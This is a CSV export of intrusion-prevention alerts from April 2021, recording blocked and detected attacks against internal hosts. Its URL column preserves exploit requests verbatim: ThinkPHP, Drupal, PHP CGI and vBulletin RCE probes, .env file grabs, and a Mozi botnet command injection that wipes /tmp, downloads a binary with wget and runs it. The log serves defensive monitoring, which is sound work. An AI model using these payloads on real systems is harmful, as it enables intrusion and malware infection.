Severity,Rule Message,Subcategory,Event Count,Source IP,Source Port,Destination IP,Destination Port,Protocol,Last Time,URL,Event Subtype
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,194.5.249.26,https-ssl,10.64.232.140,60058,tcp,09-04-2021 01:54:23,http://49.40.19.38:443/,alert
25,CS_InBound_NTP_Attack Event Detected,Remote Command Injection Activity 2 attack blocked,1,120.85.117.229,6707,10.63.58.173,0,tcp,09-04-2021 01:53:53,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,Gpon Router Cmd Injection CVE-2018-10562 attack blocked,1,120.85.117.229,6707,10.63.58.173,0,tcp,09-04-2021 01:53:53,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,XML External Entity Attack attack blocked,1,45.155.205.211,43920,10.135.132.152,0,tcp,09-04-2021 01:42:41,http://49.40.2.178:80/Autodiscover/Autodiscover.xml,alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,45.155.205.211,46724,10.135.132.152,0,tcp,09-04-2021 01:42:40,http://49.40.2.178:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,45.155.205.211,45924,10.135.132.152,0,tcp,09-04-2021 01:42:40,http://49.40.2.178:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,45.155.205.211,36512,10.63.58.173,0,tcp,09-04-2021 00:53:58,http://49.40.26.149:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,alert
25,CS_InBound_NTP_Attack Event Detected,XML External Entity Attack attack blocked,1,45.155.205.211,44038,10.63.58.173,0,tcp,09-04-2021 00:53:58,http://49.40.26.149:80/Autodiscover/Autodiscover.xml,alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,45.155.205.211,44580,10.63.58.173,0,tcp,09-04-2021 00:53:54,http://49.40.26.149:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,alert
25,CS_OutBound_NTP_Attack Event Detected,Environment Config File Download Attempt attack blocked,1,13.64.179.88,http,10.63.58.173,53477,tcp,08-04-2021 22:51:12,http://49.40.26.149/.env,alert
25,CS_OutBound_NTP_Attack Event Detected,Environment Config File Download Attempt attack blocked,1,167.71.68.203,http,10.63.58.173,38772,tcp,08-04-2021 22:23:59,http://49.40.26.149/.env,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.238.31,8080,10.141.154.25,10716,tcp,08-04-2021 17:32:14,http://49.40.14.88:8080/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.144.34.109,54254,tcp,08-04-2021 16:22:34,http://49.40.22.81/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.135.140.146,33412,tcp,08-04-2021 16:15:35,http://49.40.2.120/,alert
25,CS_OutBound_NTP_Attack Event Detected,Environment Config File Download Attempt attack blocked,1,45.144.225.244,http,10.135.132.152,56921,tcp,08-04-2021 16:07:05,http://49.40.2.178/.env,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.135.130.72,45892,tcp,08-04-2021 16:01:04,http://49.40.8.35/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.135.132.152,26982,tcp,08-04-2021 15:45:50,http://49.40.2.178/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.63.58.173,19816,tcp,08-04-2021 15:38:42,http://49.40.26.149/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.64.232.140,18558,tcp,08-04-2021 15:18:40,http://49.40.19.38/,alert
25,CS_OutBound_NTP_Attack Event Detected,Malicious Scan Attempt 2 attack detected but not blocked,1,88.5.237.10,http,10.135.130.74,45230,tcp,08-04-2021 15:18:27,http://49.40.8.37/,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,51851,10.135.140.95,0,tcp,08-04-2021 14:21:28,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52305,10.143.80.131,0,tcp,08-04-2021 14:20:37,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52114,10.141.154.25,0,tcp,08-04-2021 14:20:36,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52237,172.16.33.143,0,tcp,08-04-2021 14:20:36,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52260,10.63.58.173,0,tcp,08-04-2021 14:20:36,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,51857,10.135.131.11,0,tcp,08-04-2021 14:20:35,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,51893,10.135.130.74,0,tcp,08-04-2021 14:20:35,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,51852,10.135.140.146,0,tcp,08-04-2021 14:20:35,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52178,10.64.232.140,0,tcp,08-04-2021 14:20:35,,alert
25,CS_InBound_NTP_Attack Event Detected,RDP Bruteforce Attempt 2 attack detected but not blocked,1,1.55.212.66,52223,10.144.34.109,0,tcp,08-04-2021 14:20:11,,alert
25,CS_InBound_NTP_Attack Event Detected,Drupal RCE CVE-2018-7600 attack blocked,1,84.201.163.159,60610,10.135.130.74,0,tcp,08-04-2021 13:23:09,http://49.40.8.37:80/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax,alert
25,CS_InBound_NTP_Attack Event Detected,Remote Command Injection Activity 2 attack blocked,1,103.41.25.96,55196,10.144.34.109,0,tcp,08-04-2021 12:41:05,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,Gpon Router Cmd Injection CVE-2018-10562 attack blocked,1,103.41.25.96,55196,10.144.34.109,0,tcp,08-04-2021 12:41:05,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,ECShop SQL Injection Attempt attack blocked,1,103.140.127.84,19283,10.135.132.152,0,tcp,08-04-2021 12:31:56,http://49.40.2.178/%75%73%65%72%2e%70%68%70,alert
25,CS_OutBound_NTP_Attack Event Detected,Joomla Remote Code Execution CVE-2015-8562 attack blocked,1,103.140.127.84,http,10.135.132.152,18368,tcp,08-04-2021 12:31:45,http://49.40.2.178/Joomla/,alert
25,CS_OutBound_NTP_Attack Event Detected,Joomla Remote Code Execution CVE-2015-8562 attack blocked,1,103.140.127.84,http,10.135.132.152,17484,tcp,08-04-2021 12:31:43,http://49.40.2.178/,alert
25,CS_InBound_NTP_Attack Event Detected,Drupal RCE CVE-2018-7600 attack blocked,1,103.140.127.84,13994,10.135.132.152,0,tcp,08-04-2021 12:31:42,http://49.40.2.178/%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%6,alert
25,CS_InBound_NTP_Attack Event Detected,Drupal RCE CVE-2018-7600 attack blocked,1,103.140.127.84,13994,10.135.132.152,0,tcp,08-04-2021 12:31:42,http://49.40.2.178/%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%6,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution 2 attack blocked,1,103.140.127.84,13481,10.135.132.152,0,tcp,08-04-2021 12:31:40,http://49.40.2.178/index.php,alert
25,CS_OutBound_NTP_Attack Event Detected,PHP Shell Upload 8 attack blocked,1,103.140.127.84,http,10.135.132.152,34017,tcp,08-04-2021 12:29:41,http://49.40.2.178/404.php,alert
25,CS_InBound_NTP_Attack Event Detected,CCTV-DVR Remote Code Execution attack blocked,1,112.94.97.174,1029,10.135.132.152,0,tcp,08-04-2021 12:29:36,http://49.40.2.178:80/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,alert
25,CS_InBound_NTP_Attack Event Detected,Remote OS Command Injection attack blocked,1,112.94.97.174,1029,10.135.132.152,0,tcp,08-04-2021 12:29:36,http://49.40.2.178:80/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,alert
25,CS_InBound_NTP_Attack Event Detected,Remote Command Injection Activity 2 attack blocked,1,112.94.97.174,1029,10.135.132.152,0,tcp,08-04-2021 12:29:36,http://49.40.2.178:80/shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws,alert
25,CS_InBound_NTP_Attack Event Detected,Suspicious PHP URI location attack blocked,1,103.140.127.84,28794,10.135.132.152,0,tcp,08-04-2021 12:26:30,http://49.40.2.178/images/stories/cmd.php,alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,103.140.127.84,25032,10.135.132.152,0,tcp,08-04-2021 12:26:19,http://49.40.2.178/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,103.140.127.84,24601,10.135.132.152,0,tcp,08-04-2021 12:26:18,http://49.40.2.178/App/?content=die(md5(HelloThinkPHP)),alert
25,CS_OutBound_NTP_Attack Event Detected,Web CMS Think PHP RCE 2 attack blocked,1,103.140.127.84,http,10.135.132.152,24758,tcp,08-04-2021 12:26:18,http://49.40.2.178/index.php/module/action/param1/${@die(md5(HelloThinkPHP))},alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,103.140.127.84,24758,10.135.132.152,0,tcp,08-04-2021 12:26:18,http://49.40.2.178/index.php/module/action/param1/${@die(md5(HelloThinkPHP))},alert
25,CS_OutBound_NTP_Attack Event Detected,Web CMS Think PHP RCE 2 attack blocked,1,103.140.127.84,http,10.135.132.152,24904,tcp,08-04-2021 12:26:18,http://49.40.2.178/index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))},alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,103.140.127.84,24904,10.135.132.152,0,tcp,08-04-2021 12:26:18,http://49.40.2.178/index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))},alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,103.140.127.84,24322,10.135.132.152,0,tcp,08-04-2021 12:26:17,http://49.40.2.178/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,103.140.127.84,24322,10.135.132.152,0,tcp,08-04-2021 12:26:17,http://49.40.2.178/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,103.140.127.84,24454,10.135.132.152,0,tcp,08-04-2021 12:26:17,http://49.40.2.178/elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 attack blocked,1,103.140.127.84,15648,10.135.132.152,0,tcp,08-04-2021 12:25:52,http://49.40.2.178/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 2 attack blocked,1,103.140.127.84,15648,10.135.132.152,0,tcp,08-04-2021 12:25:52,http://49.40.2.178/cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 attack blocked,1,103.140.127.84,15170,10.135.132.152,0,tcp,08-04-2021 12:25:50,http://49.40.2.178/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%6,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 2 attack blocked,1,103.140.127.84,15170,10.135.132.152,0,tcp,08-04-2021 12:25:50,http://49.40.2.178/cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%6,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 attack blocked,1,103.140.127.84,14707,10.135.132.152,0,tcp,08-04-2021 12:25:49,http://49.40.2.178/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%6,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 2 attack blocked,1,103.140.127.84,14707,10.135.132.152,0,tcp,08-04-2021 12:25:49,http://49.40.2.178/cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%6,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 attack blocked,1,103.140.127.84,14237,10.135.132.152,0,tcp,08-04-2021 12:25:47,http://49.40.2.178/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 2 attack blocked,1,103.140.127.84,14237,10.135.132.152,0,tcp,08-04-2021 12:25:47,http://49.40.2.178/cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%7,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 attack blocked,1,103.140.127.84,13764,10.135.132.152,0,tcp,08-04-2021 12:25:46,http://49.40.2.178/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75,alert
25,CS_InBound_NTP_Attack Event Detected,PHP CGI CVE-2012-1823 2 attack blocked,1,103.140.127.84,13764,10.135.132.152,0,tcp,08-04-2021 12:25:46,http://49.40.2.178/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin CVE-2020-17496 attack blocked,1,103.140.127.84,13295,10.135.132.152,0,tcp,08-04-2021 12:25:45,http://49.40.2.178/forums/ajax/render/widget_tabbedcontainer_tab_panel,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin CVE-2020-17496 attack blocked,1,103.140.127.84,12851,10.135.132.152,0,tcp,08-04-2021 12:25:43,http://49.40.2.178/forum/ajax/render/widget_tabbedcontainer_tab_panel,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin CVE-2020-17496 attack blocked,1,103.140.127.84,12381,10.135.132.152,0,tcp,08-04-2021 12:25:42,http://49.40.2.178/bbs/ajax/render/widget_tabbedcontainer_tab_panel,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin CVE-2020-17496 attack blocked,1,103.140.127.84,11917,10.135.132.152,0,tcp,08-04-2021 12:25:40,http://49.40.2.178/ajax/render/widget_tabbedcontainer_tab_panel,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,11468,10.135.132.152,0,tcp,08-04-2021 12:25:39,http://49.40.2.178/forums/index.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,11010,10.135.132.152,0,tcp,08-04-2021 12:25:38,http://49.40.2.178/forum/index.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,10561,10.135.132.152,0,tcp,08-04-2021 12:25:36,http://49.40.2.178/bbs/index.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,10086,10.135.132.152,0,tcp,08-04-2021 12:25:35,http://49.40.2.178/forums.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,9634,10.135.132.152,0,tcp,08-04-2021 12:25:33,http://49.40.2.178/forum.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,9179,10.135.132.152,0,tcp,08-04-2021 12:25:32,http://49.40.2.178/bbs.php,alert
25,CS_InBound_NTP_Attack Event Detected,vBulletin Remote Code Execution CVE-2019-16759 attack blocked,1,103.140.127.84,8730,10.135.132.152,0,tcp,08-04-2021 12:25:31,http://49.40.2.178/index.php,alert
25,CS_OutBound_NTP_Attack Event Detected,Environment Config File Download Attempt attack blocked,1,167.71.68.203,http,10.64.232.140,54198,tcp,08-04-2021 11:06:54,http://49.40.19.38/.env,alert
25,CS_OutBound_NTP_Attack Event Detected,Environment Config File Download Attempt attack blocked,1,167.71.68.203,http,10.135.132.152,36190,tcp,08-04-2021 11:01:46,http://49.40.2.178/.env,alert
25,CS_InBound_NTP_Attack Event Detected,Remote Command Injection Activity 2 attack blocked,1,178.175.60.58,58439,10.135.130.74,0,tcp,08-04-2021 09:28:44,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,Gpon Router Cmd Injection CVE-2018-10562 attack blocked,1,178.175.60.58,58439,10.135.130.74,0,tcp,08-04-2021 09:28:44,http://127.0.0.1:80/GponForm/diag_Form?images/,alert
25,CS_InBound_NTP_Attack Event Detected,XML External Entity Attack attack blocked,1,45.155.205.211,44066,10.63.58.173,0,tcp,08-04-2021 08:00:12,http://49.40.26.149:80/Autodiscover/Autodiscover.xml,alert
25,CS_InBound_NTP_Attack Event Detected,Malicious Scan Request attack blocked,1,45.155.205.211,52060,10.63.58.173,0,tcp,08-04-2021 08:00:08,http://49.40.26.149:80/?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php>,alert
25,CS_InBound_NTP_Attack Event Detected,ThinkPHP getShell Remote Code Execution attack blocked,1,45.155.205.211,33208,10.63.58.173,0,tcp,08-04-2021 08:00:08,http://49.40.26.149:80/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21,alert
